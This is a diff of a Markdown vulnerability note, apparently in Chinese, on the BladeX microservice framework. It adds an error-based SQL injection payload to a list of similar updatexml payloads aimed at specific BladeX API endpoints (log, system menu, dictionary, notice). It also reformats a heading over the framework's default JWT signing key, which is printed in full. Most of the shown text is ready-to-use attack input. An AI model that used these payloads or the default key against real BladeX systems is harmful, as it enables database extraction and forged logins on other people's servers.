@@ -66,14 +66,15 @@ GET /api/blade-user/list?size=100\&current=2
 
 /api/blade-log/error/list?updatexml(1,concat(0x7e,version(),0x7e),1)=1
 
-
+/api/blade-system/menu/menu-list?updatexml(1,concat(x7e,md5(20240729),x7e),1)=1
 /api/blade-system/dict-biz/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1
 
 post
 /api/blade-desk/notice/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1
 ```
 
-jwt的密钥未改
+^
+## **jwt的密钥未改**
 默认
 ```
 bladexisapowerfulmicroservicearchitectureupgradedandoptimizedfromacommercialproject
